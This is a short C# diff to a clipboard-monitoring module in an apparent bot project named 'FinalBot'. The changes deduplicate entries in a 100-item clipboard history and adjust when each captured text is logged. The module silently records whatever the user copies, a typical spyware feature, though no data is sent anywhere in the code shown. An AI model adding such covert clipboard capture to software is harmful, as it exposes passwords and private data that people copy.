@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -31,15 +32,19 @@ namespace FinalBot.Modules
                     try
                     {
                         string currentText = GetClipboardText();
-                        if (!string.IsNullOrEmpty(currentText) && currentText != _lastText)
+                        if (!string.IsNullOrWhiteSpace(currentText) && currentText != _lastText)
                         {
                             _lastText = currentText;
                             lock (_lock)
                             {
-                                _history.Add(currentText);
-                                if (_history.Count > 100) _history.RemoveAt(0);
+                                // Deduplicate: don't store if same as last history entry
+                                if (_history.Count == 0 || _history[_history.Count - 1] != currentText)
+                                {
+                                    _history.Add(currentText);
+                                    if (_history.Count > 100) _history.RemoveAt(0);
+                                    Logger.Log($"[CLIPBOARD] {currentText}");
+                                }
                             }
-                            Logger.Log($"[CLIPBOARD] {currentText}");
                         }
                     }
                     catch { } // Added try-catch block around the monitoring logic.
